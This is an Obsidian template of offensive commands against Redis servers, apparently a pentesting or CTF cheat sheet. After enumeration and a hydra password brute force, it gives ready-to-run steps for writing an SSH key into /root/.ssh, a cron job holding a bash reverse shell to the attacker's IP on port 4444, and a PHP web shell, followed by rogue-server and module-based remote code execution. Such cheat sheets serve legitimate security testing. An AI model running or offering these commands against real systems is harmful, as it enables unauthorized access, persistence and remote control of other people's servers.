# Redis — Port <% tp.frontmatter.current_port %>
<%* let ip = tp.frontmatter.target_ip; let port = tp.frontmatter.current_port || 6379 -%>

---

## Nmap
```bash
nmap -p<% port %> --script=redis-info <% ip %>
```

---

## Connect & Basic Enum
```bash
redis-cli -h <% ip %> -p <% port %>
```

```bash
# One-liner
redis-cli -h <% ip %> -p <% port %> ping
redis-cli -h <% ip %> -p <% port %> info
redis-cli -h <% ip %> -p <% port %> info server
```

```bash
# With password auth
redis-cli -h <% ip %> -p <% port %> -a <password>
```

---

## Enumeration (inside redis-cli)
```
# Ping (check auth required)
PING

# Server info — version, OS, connected clients
INFO server
INFO all

# List all keys
KEYS *

# Key count
DBSIZE

# Get value by key
GET <key>

# Key type
TYPE <key>

# List all databases and key counts
INFO keyspace

# Select a database (0 is default)
SELECT 1

# Dump all key-value pairs (dangerous on large DBs)
for key in $(redis-cli -h <% ip %> KEYS '*'); do echo "--- $key ---"; redis-cli -h <% ip %> GET "$key"; done
```

---

## Config File Dump
```bash
redis-cli -h <% ip %> -p <% port %> config get '*'
```

```bash
# Specific config values
redis-cli -h <% ip %> -p <% port %> config get dir
redis-cli -h <% ip %> -p <% port %> config get dbfilename
redis-cli -h <% ip %> -p <% port %> config get requirepass
redis-cli -h <% ip %> -p <% port %> config get bind
```

---

## Brute Force Auth
```bash
hydra -P /usr/share/wordlists/rockyou.txt redis://<% ip %>:<% port %>
```

```bash
# Manual attempt
redis-cli -h <% ip %> -p <% port %> AUTH <password>
```

---

## Write SSH Authorized Key (if Redis runs as root)
```bash
# Generate key
ssh-keygen -t rsa -b 4096 -f redis_key -N ""
```

```bash
# Write key into Redis, then dump to authorized_keys
redis-cli -h <% ip %> -p <% port %> config set dir /root/.ssh
redis-cli -h <% ip %> -p <% port %> config set dbfilename authorized_keys
redis-cli -h <% ip %> -p <% port %> set pwn "\n\n$(cat redis_key.pub)\n\n"
redis-cli -h <% ip %> -p <% port %> save
```

```bash
# Connect with the key
ssh -i redis_key root@<% ip %>
```

---

## Write Cron Job (if running as root)
```bash
redis-cli -h <% ip %> -p <% port %> config set dir /var/spool/cron/crontabs
redis-cli -h <% ip %> -p <% port %> config set dbfilename root
redis-cli -h <% ip %> -p <% port %> set pwn "\n\n* * * * * bash -i >& /dev/tcp/<% tp.frontmatter.my_ip %>/4444 0>&1\n\n"
redis-cli -h <% ip %> -p <% port %> save
```

---

## Write Web Shell (if web root is known)
```bash
redis-cli -h <% ip %> -p <% port %> config set dir /var/www/html
redis-cli -h <% ip %> -p <% port %> config set dbfilename shell.php
redis-cli -h <% ip %> -p <% port %> set pwn '<?php system($_GET["cmd"]); ?>'
redis-cli -h <% ip %> -p <% port %> save
```

---

## Redis Rogue Server RCE (Redis < 5.0.9 OR with MODULE support)

```bash
# https://github.com/n0b0dyCN/redis-rogue-server
python3 redis-rogue-server.py --rhost <% ip %> --lhost <% tp.frontmatter.my_ip %>
```

```bash
# Module-based RCE: https://github.com/n0b0dyCN/RedisModules-ExecuteCommand
redis-cli -h <% ip %> -p <% port %> MODULE LOAD /tmp/module.so
redis-cli -h <% ip %> -p <% port %> system.exec "id"
```

---

## Interesting Locations
```
/etc/redis/redis.conf              — Main config (contains requirepass, bind)
/etc/redis.conf
/var/lib/redis/                    — Data directory
/var/log/redis/redis-server.log    — Log file
```

---

## Notes
